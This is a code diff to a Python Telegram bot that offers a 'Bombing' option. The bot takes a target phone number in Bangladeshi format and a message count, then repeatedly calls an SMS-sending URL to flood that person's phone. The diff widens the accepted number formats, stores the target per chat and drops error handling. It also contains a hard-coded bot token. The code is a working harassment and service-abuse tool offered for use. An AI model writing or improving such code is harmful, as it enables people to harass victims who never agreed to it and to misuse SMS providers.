@@ -1,13 +1,18 @@
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import (
-    ApplicationBuilder, CommandHandler, MessageHandler, ConversationHandler,
-    ContextTypes, filters
+    ApplicationBuilder,
+    CommandHandler,
+    MessageHandler,
+    ConversationHandler,
+    ContextTypes,
+    filters,
 )
 import aiohttp
 
 BOT_TOKEN = "7151398287:AAG1K29dmUNkhNSjdquTti2eU-KnydfkOvw"
 
 ASK_NUMBER, ASK_LIMIT = range(2)
+user_data = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_keyboard = [["Bombing"]]
@@ -23,16 +28,21 @@ async def ask_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Please press the 'Bombing' button.")
         return ASK_NUMBER
 
-    await update.message.reply_text("Enter target number (Format: 8801XXXXXXXXX):")
+    await update.message.reply_text("Enter target number (Format: 01XXXXXXXXX or 8801XXXXXXXXX):")
     return ASK_LIMIT
 
 async def ask_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     number = update.message.text.strip()
-    if not number.startswith("880") or not number.isdigit():
-        await update.message.reply_text("Invalid number. Try again with format 8801XXXXXXXXX:")
+
+    if number.startswith("01") and len(number) == 11:
+        number = "880" + number
+    elif number.startswith("880") and len(number) == 13:
+        pass
+    else:
+        await update.message.reply_text("Invalid number. Format: 01XXXXXXXXX or 8801XXXXXXXXX")
         return ASK_LIMIT
 
-    context.user_data["number"] = number
+    user_data[update.effective_chat.id] = {"number": number}
     await update.message.reply_text("How many SMS to send?")
     return ConversationHandler.END
 
@@ -43,7 +53,9 @@ async def get_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Please enter a valid number for limit.")
         return
 
-    number = context.user_data.get("number")
+    chat_id = update.effective_chat.id
+    number = user_data.get(chat_id, {}).get("number")
+
     if not number:
         await update.message.reply_text("Something went wrong. Start again with /start")
         return
@@ -55,14 +67,11 @@ async def get_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     async with aiohttp.ClientSession() as session:
         for _ in range(limit):
-            try:
-                async with session.get(url) as resp:
-                    if resp.status == 200:
-                        success += 1
-                    else:
-                        fail += 1
-            except:
-                fail += 1
+            async with session.get(url) as resp:
+                if resp.status == 200:
+                    success += 1
+                else:
+                    fail += 1
 
     await update.message.reply_text(f"Done!\nSuccess: {success}\nFailed: {fail}")
 
